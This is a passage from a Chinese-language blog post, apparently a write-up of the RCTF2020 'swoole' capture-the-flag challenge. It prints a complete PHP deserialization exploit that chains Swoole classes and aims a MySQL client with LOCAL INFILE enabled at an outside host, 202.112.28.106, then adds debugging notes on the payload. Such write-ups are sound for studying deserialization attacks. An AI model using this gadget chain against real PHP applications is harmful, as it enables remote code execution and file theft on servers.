class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Swoole</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ObjectProxy</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">__object</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($obj)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__object = $obj;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ConnectionPool</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">const</span> DEFAULT_SIZE = <span class="number">64</span>;</span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> Channel */</span></span><br><span class="line">        <span class="keyword">protected</span> $pool;</span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> callable */</span></span><br><span class="line">        <span class="keyword">protected</span> $constructor;</span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> int */</span></span><br><span class="line">        <span class="keyword">protected</span> $size = <span class="number">100</span>;</span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> int */</span></span><br><span class="line">        <span class="keyword">protected</span> $num = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> null|string */</span></span><br><span class="line">        <span class="keyword">protected</span> $proxy;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($constructor,$pool)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;constructor = $constructor;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;proxy = <span class="string">"Swoole\Database\MysqliPool"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = $pool;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">use</span> <span class="title">Serializable</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ArrayObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $array = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;array);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;array = unserialize($string);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Swoole</span>\<span class="title">Curl</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">Handler</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">client</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $info = [</span><br><span class="line">            <span class="string">'url'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">            <span class="string">'content_type'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">            <span class="string">'http_code'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">'header_size'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">'request_size'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">'filetime'</span> =&gt; <span class="number">-1</span>,</span><br><span class="line">            <span class="string">'ssl_verify_result'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">'redirect_count'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">'total_time'</span> =&gt; <span class="number">5.3E-5</span>,</span><br><span class="line">            <span class="string">'namelookup_time'</span> =&gt; <span class="number">0.0</span>,</span><br><span class="line">            <span class="string">'connect_time'</span> =&gt; <span class="number">0.0</span>,</span><br><span class="line">            <span class="string">'pretransfer_time'</span> =&gt; <span class="number">0.0</span>,</span><br><span class="line">            <span class="string">'size_upload'</span> =&gt; <span class="number">0.0</span>,</span><br><span class="line">            <span class="string">'size_download'</span> =&gt; <span class="number">0.0</span>,</span><br><span class="line">            <span class="string">'speed_download'</span> =&gt; <span class="number">0.0</span>,</span><br><span class="line">            <span class="string">'speed_upload'</span> =&gt; <span class="number">0.0</span>,</span><br><span class="line">            <span class="string">'download_content_length'</span> =&gt; <span class="number">-1.0</span>,</span><br><span class="line">            <span class="string">'upload_content_length'</span> =&gt; <span class="number">-1.0</span>,</span><br><span class="line">            <span class="string">'starttransfer_time'</span> =&gt; <span class="number">0.0</span>,</span><br><span class="line">            <span class="string">'redirect_time'</span> =&gt; <span class="number">0.0</span>,</span><br><span class="line">            <span class="string">'redirect_url'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">            <span class="string">'primary_ip'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">            <span class="string">'certinfo'</span> =&gt; [],</span><br><span class="line">            <span class="string">'primary_port'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">'local_ip'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">            <span class="string">'local_port'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">'http_version'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">'protocol'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">'ssl_verifyresult'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">'scheme'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        ];    </span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $withHeaderOut = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $withFileTime = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $urlInfo;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $postData;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $infile;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $infileSize = PHP_INT_MAX;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $outputStream;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $proxyType;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $proxy;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $proxyPort = <span class="number">1080</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $proxyUsername;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $proxyPassword;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $clientOptions = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $followLocation = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $autoReferer = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $maxRedirects;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $withHeader = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $nobody = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> callable */</span></span><br><span class="line">        <span class="keyword">private</span> $headerFunction;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> callable */</span></span><br><span class="line">        <span class="keyword">private</span> $readFunction;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> callable */</span></span><br><span class="line">        <span class="keyword">private</span> $writeFunction;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> callable */</span></span><br><span class="line">        <span class="keyword">private</span> $progressFunction;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $returnTransfer = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $method = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $headers = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $transfer;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $errCode = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $errMsg = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $failOnError = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $closed = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($fuc1, $func2)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;headerFunction = $fuc1;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;readFunction = $func2;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;closed = <span class="keyword">FALSE</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;urlInfo = <span class="keyword">array</span>(<span class="string">"host"</span>=&gt;<span class="string">"202.112.28.106"</span>,<span class="string">"port"</span>=&gt;<span class="number">8030</span>,<span class="string">"scheme"</span>=&gt;<span class="string">"http"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Swoole</span>\<span class="title">Database</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MysqliProxy</span>&#123;</span><br><span class="line">        /** @<span class="title">var</span> <span class="title">mysqli</span> */</span><br><span class="line">        <span class="title">protected</span> $<span class="title">__object</span>;</span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> callable */</span></span><br><span class="line">        <span class="keyword">protected</span> $constructor;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($constructor)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;constructor = $constructor;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MysqliConfig</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> string */</span></span><br><span class="line">        <span class="keyword">protected</span> $host = <span class="string">'202.112.28.106'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> int */</span></span><br><span class="line">        <span class="keyword">protected</span> $port = <span class="number">3306</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> null|string */</span></span><br><span class="line">        <span class="keyword">protected</span> $unixSocket = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> string */</span></span><br><span class="line">        <span class="keyword">protected</span> $dbname = <span class="string">'test'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> string */</span></span><br><span class="line">        <span class="keyword">protected</span> $charset = <span class="string">'utf8mb4'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> string */</span></span><br><span class="line">        <span class="keyword">protected</span> $username = <span class="string">'root'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> string */</span></span><br><span class="line">        <span class="keyword">protected</span> $password = <span class="string">'root'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> array */</span></span><br><span class="line">        <span class="keyword">protected</span> $options = <span class="keyword">Array</span>(MYSQLI_OPT_LOCAL_INFILE=&gt;<span class="keyword">True</span>,MYSQLI_INIT_COMMAND=&gt;<span class="string">"select 1;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">mysqliconfig</span> = <span class="title">new</span> <span class="title">Swoole</span>\<span class="title">Database</span>\<span class="title">MysqliConfig</span>();</span><br><span class="line">    $pool = <span class="keyword">new</span> Swoole\ArrayObject();</span><br><span class="line">    <span class="comment">// $pool = new SplDoublyLinkedList();</span></span><br><span class="line">    $connectionpool = <span class="keyword">new</span> Swoole\ConnectionPool($mysqliconfig, $pool);</span><br><span class="line">    $mysqliproxy = <span class="keyword">new</span> Swoole\Database\MysqliProxy([$connectionpool, <span class="string">"get"</span>]);</span><br><span class="line">    $handler = <span class="keyword">new</span> Swoole\Curl\Handler([$mysqliproxy, <span class="string">"reconnect"</span>],[$mysqliproxy,<span class="string">"get"</span>]);</span><br><span class="line">    $s = serialize([$handler,<span class="string">"exec"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> base64_encode($s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在构造上面exp的时候遇见了几个坑</p>
+<ol>
+<li><p>port 要设置成整数，这个通过报错容易发现</p>
+</li>
+<li><p>ArrayObject 不能直接写成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class ArrayObject&#123;</span><br><span class="line">	protected $array = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这是上面序列化的结果<code>O:18:&quot;Swoole\ArrayObject&quot;:1:{s:8:&quot;\00*\00array&quot;;a:0:{}}</code></p>
+<p>这个才是真正的序列化的结果</p>
+<p><code>C:18:&quot;Swoole\ArrayObject&quot;:6:{a:0:{}}</code></p>
+<p>而且在凑这个的时候发下了他的一个bug</p>
+<blockquote>
+<p>如果返回除了字符串或 <strong><code>NULL</code></strong> 之外的其他类型，将抛出 <a href="https://www.php.net/manual/zh/class.exception.php" target="_blank" rel="noopener">Exception</a>。</p>
+</blockquote>
+<p>代码里面强行返回了一个SpringObject，会导致在序列化的时候出现</p>
+<p><code>Fatal error: Uncaught Exception: Swoole\ArrayObject::serialize() must return a string or NULL</code> </p>
+</li>
+<li><p>size的值要设置的大一些, 因为有for循环会多次调用num值会变大，如果num值大于了size就会pop空，找这个问题在哪，找的我怀疑狗生。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#0 @swoole-src/library/core/Database/MysqliProxy.php(88): Swoole\ObjectProxy-&gt;__construct(NULL)</span><br><span class="line">#1 @swoole-src/library/core/Curl/Handler.php(759): Swoole\Database\MysqliProxy-&gt;reconnect(Object(Swoole\Curl\Handler), &apos;server: SimpleH...&apos;)</span><br><span class="line">#2 @swoole-src/library/core/Curl/Handler.php(156): Swoole\Curl\Handler-&gt;execute()</span><br><span class="line">#3 /app/server.php(38): Swoole\Curl\Handler-&gt;exec()</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>另外在构造的时候忽然想到</p>
+<p><code>[$mysqliproxy, &#39;reconnect&#39;]</code> 和<code>[$mysqliproxy, &#39;get&#39;]</code> 中的<code>$mysqliproxy</code> 反序列化的时候会不会被序列化成两个不同的对象，如果被反序列化成了两个不同的对象就GG了。用下面的程序模拟了一下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $h = <span class="string">"haha"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c = <span class="string">"x"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($f1, $f2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;f1 = $f1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;f2 = $f2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$a = <span class="keyword">new</span> A($b, $b);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure>
+<p>输出是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:3:&#123;s:1:&quot;c&quot;;s:1:&quot;x&quot;;s:2:&quot;f1&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;h&quot;;s:4:&quot;haha&quot;;&#125;s:2:&quot;f2&quot;;r:3;&#125;</span><br></pre></td></tr></table></figure>
+<p>后来查到了这个 <a href="http://www.phpinternalsbook.com/php5/classes_objects/serialization.html" target="_blank" rel="noopener">http://www.phpinternalsbook.com/php5/classes_objects/serialization.html</a></p>
+<blockquote>
+<p>As objects in PHP exhibit a reference-like behavior <code>serialize</code> also makes sure that the same object occurring twice will really be the same object on unserialization</p>
+</blockquote>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2020/swoole" target="_blank" rel="noopener">https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2020/swoole</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/php/" rel="tag"># php</a>
+            
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+            
+              <a href="/tags/unserialize/" rel="tag"># unserialize</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/05/21/codeql-structs-xml-deserialization/" rel="next" title="Learn CodeQL for Java by workshop">
+                  <i class="fa fa-chevron-left"></i> Learn CodeQL for Java by workshop
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题目介绍"><span class="nav-number">2.</span> <span class="nav-text">题目介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">3.</span> <span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RCE"><span class="nav-number">3.1.</span> <span class="nav-text">RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#预期做法"><span class="nav-number">3.2.</span> <span class="nav-text">预期做法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-number">3.3.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考链接"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">yxxx</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">tags</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yxxx</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
